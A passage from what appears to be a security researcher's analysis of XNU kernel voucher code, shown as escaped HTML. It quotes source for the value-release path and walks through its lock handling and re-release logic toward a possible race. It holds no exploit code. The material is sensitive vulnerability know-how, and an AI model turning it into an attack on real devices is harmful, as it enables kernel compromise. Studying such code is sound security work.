 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* callout to manager&amp;#39;s release_value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* recalculate entry address as table may have changed */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* new made values raced with this return. &amp;nbsp;If the&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* manager OK&amp;#39;ed the prior release, we have to start&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the made numbering over again (pretend the race&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* didn&amp;#39;t happen). If the entry has zero refs again,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* re-drive the release.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;goto&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;They grab the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock again and recalculate a pointer to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;(because the table could have been reallocated while the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;lock was dropped, and only the index into the table would be valid, not a pointer.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Then things get really weird; if &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t equal to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;made&lt;/span&gt;&lt;span&gt;&amp;nbsp;but &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_release_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;did return &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span&gt;, then they subtract the old value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the current value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;, and if &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;0&lt;/span&gt;&lt;span&gt;, they use a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;goto&lt;/span&gt;&lt;span&gt;&amp;nbsp;statement to try to free the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;again?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;If that makes complete sense to you at first glance then give yourself a gold star! Because to me at first that logic was completely impenetrable. We will get to the bottom of it though.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;We need to ask the question: under what circumstances will &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field ever be different? To answer this we need to look back at &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_replace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;where the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;are actually allocated:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.6678b43a7a459c004d346e8b4b835a591c986cfd&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.48&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_flag&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
